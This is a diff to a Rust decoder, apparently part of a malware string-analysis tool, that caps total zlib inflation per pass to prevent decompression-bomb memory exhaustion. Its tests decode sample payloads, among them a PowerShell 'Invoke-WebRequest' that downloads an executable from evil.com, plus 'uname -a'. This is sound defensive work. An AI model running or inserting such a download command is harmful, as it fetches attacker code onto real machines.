@@ -8,6 +8,7 @@ use data_encoding::{BASE32, BASE32_NOPAD};
 use rayon::prelude::*;
 use regex::Regex;
 use std::sync::LazyLock;
+use std::sync::atomic::{AtomicUsize, Ordering};
 
 #[cfg(test)]
 #[path = "decoders_zlib_test.rs"]
@@ -65,6 +66,10 @@ pub(crate) const MIN_HEX_LENGTH: usize = 16;
 
 /// Maximum size for decoded output (to prevent memory exhaustion)
 pub(crate) const MAX_DECODED_SIZE: usize = 10 * 1024 * 1024; // 10MB
+/// Bytes zlib inflation may produce across one decoder pass. Each payload is
+/// capped at [`MAX_DECODED_SIZE`], but 14 KB of input inflates to that, so
+/// without a shared total a megabyte of such lines held gigabytes.
+const MAX_INFLATED_PER_PASS: usize = 4 * MAX_DECODED_SIZE;
 
 /// Validate freshly decoded bytes as printable text, enforcing the size cap.
 ///
@@ -187,6 +192,7 @@ pub(crate) fn deobfuscate_concatenation(s: &str) -> Option<String> {
 /// Unlike `decode_base64_strings` which decodes entire strings that are base64,
 /// this function extracts base64 substrings from within larger strings.
 pub(crate) fn extract_embedded_base64(strings: &[ExtractedString]) -> Vec<ExtractedString> {
+    let budget = AtomicUsize::new(MAX_INFLATED_PER_PASS);
     // Each input string can yield several embedded payloads; `flat_map_iter`
     // parallelises across strings while keeping each string's per-capture order.
     strings
@@ -234,7 +240,7 @@ pub(crate) fn extract_embedded_base64(strings: &[ExtractedString]) -> Vec<Extrac
 
                         // Base64 can wrap binary zlib data. Inflate before asking
                         // for text, just as the sample's runtime decoder does.
-                        if let Some((decoded_str, _)) = base64_payload_to_text(decoded) {
+                        if let Some((decoded_str, _)) = base64_payload_to_text(decoded, &budget) {
                             let trimmed = decoded_str.trim();
 
                             // Must be meaningful (at least 4 chars after trim)
@@ -325,13 +331,14 @@ pub(crate) fn extract_embedded_hex(strings: &[ExtractedString]) -> Vec<Extracted
 /// Returns a vector of newly decoded strings with `StringMethod::Base64Decode`.
 /// Also attempts to deobfuscate concatenated strings first.
 pub(crate) fn decode_base64_strings(strings: &[ExtractedString]) -> Vec<ExtractedString> {
+    let budget = AtomicUsize::new(MAX_INFLATED_PER_PASS);
     strings
         .par_iter()
         .with_min_len(crate::par::MIN_ITEMS_PER_JOB)
         .filter_map(|s| {
             // Try normal base64 decoding first
             if (s.kind == Some(StringKind::Base64) || is_likely_base64(&s.value))
-                && let Some(decoded) = decode_base64_string(s)
+                && let Some(decoded) = decode_base64_string(s, &budget)
             {
                 return Some(decoded);
             }
@@ -352,7 +359,7 @@ pub(crate) fn decode_base64_strings(strings: &[ExtractedString]) -> Vec<Extracte
                     ..Default::default()
                 };
 
-                return decode_base64_string(&temp);
+                return decode_base64_string(&temp, &budget);
             }
 
             None
@@ -383,7 +390,9 @@ fn decode_base64_bytes(value: &str) -> Option<Vec<u8>> {
 /// Recover text from Base64 output, including the common Base64 → zlib chain.
 /// The bool marks a validated compression stream or wide-text signature, which
 /// is stronger evidence than the ASCII quality heuristic for plain Base64.
-fn base64_payload_to_text(decoded: Vec<u8>) -> Option<(String, bool)> {
+/// Inflated bytes are charged to `budget`; once it is spent, compressed
+/// payloads are refused.
+fn base64_payload_to_text(decoded: Vec<u8>, budget: &AtomicUsize) -> Option<(String, bool)> {
     if decoded.len() > MAX_DECODED_SIZE {
         return None;
     }
@@ -400,6 +409,18 @@ fn base64_payload_to_text(decoded: Vec<u8>) -> Option<(String, bool)> {
     // with the valid 78 20 dictionary header. If inflation fails, preserve the
     // existing plain-text path, but never coerce compressed binary into text.
     let inflated = has_zlib_header.then(|| inflate_zlib(&decoded)).flatten();
+    if let Some(inflated) = &inflated
+        && budget
+            .try_update(Ordering::Relaxed, Ordering::Relaxed, |left| {
+                left.checked_sub(inflated.len())
+            })
+            .is_err()
+    {
+        tracing::warn!(
+            "zlib inflation budget of {MAX_INFLATED_PER_PASS} bytes spent; payload skipped"
+        );
+        return None;
+    }
     let is_zlib = inflated.is_some();
     let bytes = inflated.unwrap_or(decoded);
     let is_wide = looks_like_utf16le(&bytes);
@@ -452,14 +473,14 @@ fn inflate_zlib(input: &[u8]) -> Option<Vec<u8>> {
 }
 
 /// Attempt to decode a single base64 string.
-fn decode_base64_string(s: &ExtractedString) -> Option<ExtractedString> {
+fn decode_base64_string(s: &ExtractedString, budget: &AtomicUsize) -> Option<ExtractedString> {
     if s.value.len() < MIN_BASE64_LENGTH {
         return None;
     }
 
     let decoded = decode_base64_bytes(s.value.trim())?;
 
-    let (decoded_str, validated_payload) = base64_payload_to_text(decoded)?;
+    let (decoded_str, validated_payload) = base64_payload_to_text(decoded, budget)?;
 
     // Reject if decoded string is too short or just whitespace
     let trimmed = decoded_str.trim();
@@ -1335,7 +1356,7 @@ mod tests {
             ..Default::default()
         };
 
-        let result = decode_base64_string(&input).unwrap();
+        let result = decode_base64_string(&input, &AtomicUsize::new(usize::MAX)).unwrap();
         assert_eq!(result.value, "Hello World!");
         assert_eq!(result.method, StringMethod::Base64Decode);
     }
@@ -1351,7 +1372,7 @@ mod tests {
             ("dW5hbWUgLWE=", "uname -a"),  // 8 bytes  -> 12 chars
         ] {
             let s = make_string(encoded, Some(StringKind::Base64));
-            let out = decode_base64_string(&s)
+            let out = decode_base64_string(&s, &AtomicUsize::new(usize::MAX))
                 .unwrap_or_else(|| panic!("{encoded} should decode to {plain:?}"));
             assert_eq!(out.value, plain);
             assert_eq!(out.method, StringMethod::Base64Decode);
@@ -1396,8 +1417,11 @@ mod tests {
         // payload of `powershell -EncodedCommand`, embedded in any filetype.
         let wide = utf16le("Invoke-WebRequest http://evil.com/x.exe");
         let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
-        let result = decode_base64_string(&make_string(&b64, Some(StringKind::Base64)))
-            .expect("base64-over-utf16le should decode");
+        let result = decode_base64_string(
+            &make_string(&b64, Some(StringKind::Base64)),
+            &AtomicUsize::new(usize::MAX),
+        )
+        .expect("base64-over-utf16le should decode");
         assert_eq!(result.value, "Invoke-WebRequest http://evil.com/x.exe");
         assert_eq!(result.method, StringMethod::Base64Decode);
     }
@@ -2039,7 +2063,8 @@ mod tests {
             "SGVsbG8gV29ybGQ!",  // invalid alphabet
         ] {
             assert!(
-                decode_base64_string(&make_string(token, None)).is_none(),
+                decode_base64_string(&make_string(token, None), &AtomicUsize::new(usize::MAX))
+                    .is_none(),
                 "{token}"
             );
         }
